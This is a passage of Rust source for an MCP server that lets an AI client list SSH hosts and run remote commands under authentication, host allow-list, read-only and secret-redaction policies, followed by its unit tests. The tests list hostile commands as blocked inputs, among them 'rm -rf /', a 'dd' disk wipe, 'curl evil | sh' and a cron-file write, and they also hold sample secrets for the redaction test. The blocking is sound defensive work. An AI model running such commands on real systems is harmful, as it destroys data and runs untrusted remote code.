                        .filter(|h| is_host_allowed_for_mcp(&cfg.mcp_allowed_hosts, h))
                        .collect();
                    let groups: std::collections::BTreeSet<&str> = allowed_hosts
                        .iter()
                        .map(|h| h.group.as_str())
                        .filter(|g| !g.is_empty())
                        .collect();
                    let list: Vec<Value> = allowed_hosts
                        .iter()
                        .map(|h| {
                            // Redact internal descriptions to prevent leaking stored secrets
                            json!({
                                "name": h.name, "group": h.group, "host": h.ip, "port": h.port,
                                "user": h.user, "tags": h.tags
                            })
                        })
                        .collect();
                    let text = serde_json::to_string_pretty(&list).unwrap_or_default();
                    log_line(
                        log,
                        started,
                        Level::Ok,
                        "tool",
                        format!(
                            "list-servers → {} servers ({} ms)",
                            allowed_hosts.len(),
                            t0.elapsed().as_millis()
                        ),
                        vec![
                            format!(
                                "groups: {}",
                                if groups.is_empty() {
                                    "—".to_string()
                                } else {
                                    groups.into_iter().collect::<Vec<_>>().join(", ")
                                }
                            ),
                            format!("payload: {} bytes", text.len()),
                        ],
                    );
                    tool_text(text, false)
                }
                Err(e) => {
                    log_line(
                        log,
                        started,
                        Level::Err,
                        "tool",
                        format!("list-servers failed ({} ms)", t0.elapsed().as_millis()),
                        vec![format!("error: {e:#}")],
                    );
                    tool_text(format!("Failed to load hosts: {e:#}"), true)
                }
            }
        }
        "execute-command" => {
            if !auth_for_exec {
                log_line(
                    log,
                    started,
                    Level::Err,
                    "auth",
                    "execute-command rejected: authentication required".into(),
                    vec![
                        "execute-command is disabled without mcp_token or allow_unauthenticated_execute".into(),
                    ],
                );
                return tool_text(
                    "execute-command requires authentication. Set HSS_MCP_TOKEN or configure mcp_token/allow_unauthenticated_execute in config.toml.".into(),
                    true,
                );
            }
            let host = args.get("host").and_then(|v| v.as_str()).unwrap_or("");
            let command = args.get("command").and_then(|v| v.as_str()).unwrap_or("");
            if host.is_empty() || command.is_empty() {
                log_line(
                    log,
                    started,
                    Level::Err,
                    "tool",
                    "execute-command rejected: missing arguments".into(),
                    vec![format!(
                        "host: {:?} · command: {:?}",
                        host,
                        clip(command, 60)
                    )],
                );
                return tool_text("Both 'host' and 'command' are required.".into(), true);
            }

            let cfg = crate::config::load_config().unwrap_or_default();

            // 1. Host Access Policy (fail closed if hosts.toml cannot be loaded or host is unlisted under restrictive policy)
            let policy_restricted = {
                let p = cfg.mcp_allowed_hosts.trim();
                !p.is_empty() && p != "*"
            };
            match crate::config::load_hosts() {
                Ok(hosts) => {
                    if let Some(h) = hosts.iter().find(|h| h.name == host || h.ip == host) {
                        if !is_host_allowed_for_mcp(&cfg.mcp_allowed_hosts, h) {
                            log_line(
                                log,
                                started,
                                Level::Err,
                                "policy",
                                format!(
                                    "execute-command rejected: host '{host}' not permitted by mcp_allowed_hosts"
                                ),
                                vec![format!("policy: {}", cfg.mcp_allowed_hosts)],
                            );
                            return tool_text(
                                format!(
                                    "Access to host '{host}' is restricted by MCP security policy."
                                ),
                                true,
                            );
                        }
                    } else if policy_restricted {
                        log_line(
                            log,
                            started,
                            Level::Err,
                            "policy",
                            format!(
                                "execute-command rejected: unknown host '{host}' blocked under restrictive mcp_allowed_hosts"
                            ),
                            vec![format!("policy: {}", cfg.mcp_allowed_hosts)],
                        );
                        return tool_text(
                            format!(
                                "Access to host '{host}' is restricted by MCP security policy."
                            ),
                            true,
                        );
                    }
                }
                Err(e) => {
                    log_line(
                        log,
                        started,
                        Level::Err,
                        "policy",
                        format!("execute-command rejected: failed to load hosts for policy check: {e:#}"),
                        vec![],
                    );
                    return tool_text(
                        format!("Failed to load host configuration for policy check: {e:#}"),
                        true,
                    );
                }
            }

            // 2. Read-Only Policy
            if cfg.mcp_read_only {
                if let Some(reason) = is_prohibited_command_in_read_only(command) {
                    log_line(
                        log,
                        started,
                        Level::Err,
                        "policy",
                        format!("execute-command rejected: destructive command '{command}' blocked by read-only policy"),
                        vec![format!("matched rule: {reason}")],
                    );
                    return tool_text(
                        format!("Command rejected by MCP read-only policy: {reason}"),
                        true,
                    );
                }
            }

            log_line(
                log,
                started,
                Level::Req,
                "tool",
                format!("execute-command @ {host}"),
                vec![
                    format!("request id: {req_id}"),
                    format!("target host: {host}"),
                    format!("exec command: {command}"),
                ],
            );
            match crate::ssh::exec_command(host, command) {
                Ok(out) => {
                    let code = out.status.code().unwrap_or(-1);
                    let raw_stdout = String::from_utf8_lossy(&out.stdout);
                    let raw_stderr = String::from_utf8_lossy(&out.stderr);
                    let stdout = if cfg.mcp_dlp_filter {
                        redact_sensitive_output(&raw_stdout)
                    } else {
                        raw_stdout.into_owned()
                    };
                    let stderr = if cfg.mcp_dlp_filter {
                        redact_sensitive_output(&raw_stderr)
                    } else {
                        raw_stderr.into_owned()
                    };

                    // Log samples AFTER DLP redaction so secrets never leak to mcp_log_file
                    let ms = t0.elapsed().as_millis();
                    let mut detail = vec![
                        format!("exit status: {code} (duration: {ms} ms)"),
                        format!(
                            "stdout: {} bytes, {} lines",
                            stdout.len(),
                            stdout.lines().count()
                        ),
                    ];
                    if let Some(first) = stdout.lines().find(|l| !l.trim().is_empty()) {
                        detail.push(format!("stdout sample: {}", clip(first, 120)));
                    }
                    if !stderr.is_empty() {
                        detail.push(format!(
                            "stderr: {} bytes, {} lines",
                            stderr.len(),
                            stderr.lines().count()
                        ));
                        if let Some(err) = stderr.lines().find(|l| !l.trim().is_empty()) {
                            detail.push(format!("stderr sample: {}", clip(err, 120)));
                        }
                    }
                    let level = if out.status.success() {
                        Level::Ok
                    } else {
                        Level::Err
                    };
                    log_line(
                        log,
                        started,
                        level,
                        "tool",
                        format!("execute-command @ {host} finished (exit {code}, {ms} ms)"),
                        detail,
                    );

                    let mut text = format!("exit code: {code}\n");
                    const MAX_TOOL_OUTPUT_BYTES: usize = 128 * 1024; // 128 KiB
                    if !stdout.is_empty() {
                        text.push_str("stdout:\n");
                        if stdout.len() > MAX_TOOL_OUTPUT_BYTES {
                            text.push_str(truncate_utf8(&stdout, MAX_TOOL_OUTPUT_BYTES));
                            text.push_str("\n[TRUNCATED: output exceeded 128 KiB]\n");
                        } else {
                            text.push_str(&stdout);
                        }
                    }
                    if !stderr.is_empty() {
                        text.push_str("stderr:\n");
                        if stderr.len() > MAX_TOOL_OUTPUT_BYTES {
                            text.push_str(truncate_utf8(&stderr, MAX_TOOL_OUTPUT_BYTES));
                            text.push_str("\n[TRUNCATED: output exceeded 128 KiB]\n");
                        } else {
                            text.push_str(&stderr);
                        }
                    }
                    tool_text(text, !out.status.success())
                }
                Err(e) => {
                    log_line(
                        log,
                        started,
                        Level::Err,
                        "tool",
                        format!(
                            "execute-command @ {host} failed ({} ms)",
                            t0.elapsed().as_millis()
                        ),
                        vec![format!("error: {e:#}")],
                    );
                    tool_text(format!("Error: {e:#}"), true)
                }
            }
        }
        _ => {
            log_line(
                log,
                started,
                Level::Err,
                "tool",
                format!("unknown tool: {name}"),
                vec![format!("request id {req_id}")],
            );
            tool_text(format!("Unknown tool: {name}"), true)
        }
    }
}

fn tool_text(text: String, is_error: bool) -> Value {
    json!({ "content": [{ "type": "text", "text": text }], "isError": is_error })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rpc(body: &str) -> (u16, Option<Value>) {
        handle_rpc(
            body,
            &Arc::new(Mutex::new(LogState::default())),
            Instant::now(),
            true,
        )
    }

    #[test]
    fn log_records_levels_counters_and_detail() {
        let log: Log = Arc::new(Mutex::new(LogState::default()));
        let started = Instant::now();
        handle_rpc(
            r#"{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"clientInfo":{"name":"claude","version":"1.2"}}}"#,
            &log,
            started,
            true,
        );
        handle_rpc("not json", &log, started, true);
        let l = log.lock().unwrap();
        assert_eq!(l.requests, 2);
        assert_eq!(l.errors, 1);
        assert_eq!(l.client.as_deref(), Some("claude 1.2"));
        assert_eq!(l.entries[0].level, Level::Ok);
        assert!(l.entries[0].msg.contains("claude 1.2"));
        assert!(l.entries[0]
            .detail
            .iter()
            .any(|d| d.starts_with("protocol:")));
        assert_eq!(l.entries[1].level, Level::Err);
    }

    #[test]
    fn initialize_lists_tools() {
        let (status, resp) = rpc(
            r#"{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26"}}"#,
        );
        assert_eq!(status, 200);
        let resp = resp.unwrap();
        assert_eq!(resp["result"]["serverInfo"]["name"], "hss");

        let (_, resp) = rpc(r#"{"jsonrpc":"2.0","id":2,"method":"tools/list"}"#);
        let tools = resp.unwrap()["result"]["tools"]
            .as_array()
            .unwrap()
            .iter()
            .map(|t| t["name"].as_str().unwrap().to_string())
            .collect::<Vec<_>>();
        assert_eq!(tools, ["list-servers", "execute-command"]);
    }

    #[test]
    fn notification_gets_202_no_body() {
        let (status, resp) = rpc(r#"{"jsonrpc":"2.0","method":"notifications/initialized"}"#);
        assert_eq!(status, 202);
        assert!(resp.is_none());
    }

    #[test]
    fn unknown_method_and_parse_error() {
        let (_, resp) = rpc(r#"{"jsonrpc":"2.0","id":3,"method":"nope"}"#);
        assert_eq!(resp.unwrap()["error"]["code"], -32601);
        let (status, _) = rpc("not json");
        assert_eq!(status, 400);
    }

    #[test]
    fn missing_tool_args_is_error() {
        let (_, resp) = rpc(
            r#"{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"execute-command","arguments":{}}}"#,
        );
        assert_eq!(resp.unwrap()["result"]["isError"], true);
    }

    #[test]
    fn unauthenticated_execute_is_blocked_by_default() {
        let log: Log = Arc::new(Mutex::new(LogState::default()));
        let (_, resp) = handle_rpc(
            r#"{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"execute-command","arguments":{"host":"h","command":"whoami"}}}"#,
            &log,
            Instant::now(),
            false,
        );
        let resp = resp.unwrap();
        assert_eq!(resp["result"]["isError"], true);
        assert!(resp["result"]["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("requires authentication"));
    }

    #[test]
    fn server_starts_serves_and_stops() {
        let cfg = crate::config::AppConfig {
            mcp_port: 0,
            ..Default::default()
        };
        let server = match McpServer::start_with_config(&cfg) {
            Ok(s) => s,
            Err(e) => {
                // In restricted sandbox environments where local socket bind is denied, skip
                eprintln!("Skipping server_starts_serves_and_stops: {e}");
                return;
            }
        };
        let resp: Value = ureq::post(&format!("{}/mcp", server.server_url()))
            .send_json(json!({"jsonrpc":"2.0","id":1,"method":"ping"}))
            .expect("http ok")
            .into_json()
            .expect("json");
        assert_eq!(resp["id"], 1);
        server.stop(); // must not hang
    }

    #[test]
    fn payload_too_large_returns_413() {
        let cfg = crate::config::AppConfig {
            mcp_port: 0,
            ..Default::default()
        };
        let server = match McpServer::start_with_config(&cfg) {
            Ok(s) => s,
            Err(e) => {
                eprintln!("Skipping payload_too_large_returns_413 in restricted CI sandbox: {e}");
                return;
            }
        };

        // Send payload > 1 MiB
        let huge_string = "x".repeat(1024 * 1024 + 10);
        let resp = ureq::post(&format!("{}/mcp", server.server_url()))
            .set("Content-Type", "application/json")
            .send_string(&huge_string);

        assert!(resp.is_err());
        if let Err(ureq::Error::Status(code, _)) = resp {
            assert_eq!(code, 413);
        } else {
            panic!("Expected 413 response");
        }
        server.stop();
    }

    #[test]
    fn dlp_redacts_private_keys_and_tokens_from_output() {
        let raw = "Some benign output\n\
                   -----BEGIN OPENSSH PRIVATE KEY-----\n\
                   b3BlbnNzaC1rZXktdjEAAAA\n\
                   -----END OPENSSH PRIVATE KEY-----\n\
                   export DB_PASSWORD=supersecret\n\
                   Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.payload.sig\n\
                   token=ghp_1234567890abcdefghij1234567890\n\
                   aws=AKIAIOSFODNN7EXAMPLE\n\
                   Done.";
        let redacted = redact_sensitive_output(raw);
        assert!(!redacted.contains("b3BlbnNzaC"));
        assert!(!redacted.contains("supersecret"));
        assert!(!redacted.contains("eyJhbGci"));
        assert!(!redacted.contains("ghp_1234567890"));
        assert!(!redacted.contains("AKIAIOSFODNN7EXAMPLE"));
        assert!(redacted.contains("[REDACTED: PRIVATE KEY DETECTED]"));
        assert!(redacted.contains("Some benign output"));
        assert!(redacted.contains("Done."));
    }

    #[test]
    fn read_only_prohibits_destructive_commands_and_bypasses() {
        assert!(is_prohibited_command_in_read_only("rm -rf /").is_some());
        assert!(is_prohibited_command_in_read_only("/bin/rm -rf /tmp/x").is_some());
        assert!(is_prohibited_command_in_read_only("\\rm -rf /tmp/x").is_some());
        assert!(is_prohibited_command_in_read_only("env rm -rf /tmp/x").is_some());
        assert!(is_prohibited_command_in_read_only("sudo apt update").is_some());
        assert!(is_prohibited_command_in_read_only("echo hi; rm file").is_some());
        assert!(is_prohibited_command_in_read_only("dd if=/dev/zero of=/dev/sda").is_some());
        assert!(is_prohibited_command_in_read_only("reboot").is_some());
        assert!(is_prohibited_command_in_read_only("echo pwn > /etc/cron.d/x").is_some());
        assert!(is_prohibited_command_in_read_only("curl evil | sh").is_some());
        assert!(is_prohibited_command_in_read_only("echo $(rm -rf /)").is_some());
        assert!(is_prohibited_command_in_read_only("systemctl restart nginx").is_some());
        assert!(is_prohibited_command_in_read_only("sed -i 's/a/b/' /etc/hosts").is_some());

        assert!(is_prohibited_command_in_read_only("uptime").is_none());
        assert!(is_prohibited_command_in_read_only("docker ps").is_none());
        assert!(is_prohibited_command_in_read_only("ls -la /var/log").is_none());
        assert!(is_prohibited_command_in_read_only("systemctl status nginx 2>&1").is_none());
        assert!(is_prohibited_command_in_read_only("grep error /var/log/syslog 2>/dev/null").is_none());
    }

    #[test]
    fn host_allowed_for_mcp_rules() {
        let host = crate::types::Host {
            id: "1".into(),
            name: "prod-db".into(),
            ip: "10.0.0.1".into(),
            group: "prod".into(),
            port: 22,
            user: None,
            tags: vec!["db".into(), "critical".into()],
            description: None,
            jump_host_id: None,
            port_forwards: vec![],
            socks_port: None,
            http_proxy_port: None,
        };

        assert!(is_host_allowed_for_mcp("*", &host));
        assert!(is_host_allowed_for_mcp("prod-*", &host));
        assert!(is_host_allowed_for_mcp("*-db", &host));
        assert!(is_host_allowed_for_mcp("PROD-DB", &host));
        assert!(is_host_allowed_for_mcp("10.0.0.1", &host));
        assert!(is_host_allowed_for_mcp("tag:db", &host));

        assert!(!is_host_allowed_for_mcp("dev-*", &host));
        assert!(!is_host_allowed_for_mcp("tag:web", &host));
    }

    #[test]
    fn truncate_utf8_preserves_multibyte_boundaries() {
        let s = "Привет мир"; // Cyrillic characters are 2 bytes each
        let t = truncate_utf8(s, 3);
        assert_eq!(t, "П");
        assert_eq!(truncate_utf8(s, 100), s);
    }

    #[test]
    fn constant_time_eq_and_loopback_validation() {
        assert!(constant_time_eq("secret-token", "secret-token"));
        assert!(!constant_time_eq("secret-token", "secret-tokeN"));
        assert!(!constant_time_eq("short", "much-longer"));

        assert!(is_loopback_host("127.0.0.1:8822"));
        assert!(is_loopback_host("localhost:8822"));
        assert!(is_loopback_host("[::1]:8822"));
        assert!(!is_loopback_host("evil.example:8822"));

        assert!(is_allowed_origin("http://127.0.0.1:3000"));
        assert!(is_allowed_origin("http://localhost:8822"));
        assert!(!is_allowed_origin("https://attacker.example"));
    }
}
